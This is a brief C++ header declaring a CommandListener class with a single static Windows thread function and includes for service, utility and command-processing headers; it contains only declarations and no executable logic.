#pragma once
#ifndef COMMANDLISTENER
#define COMMANDLISTENER

#include <windows.h>
#include "GoogleServiceServer.h"
#include "PublicFunction.h"
#include "CommandProcess.h"


class CommandListener {
public:

	static DWORD __stdcall CommandListener::Commandlistener();
};

#endif
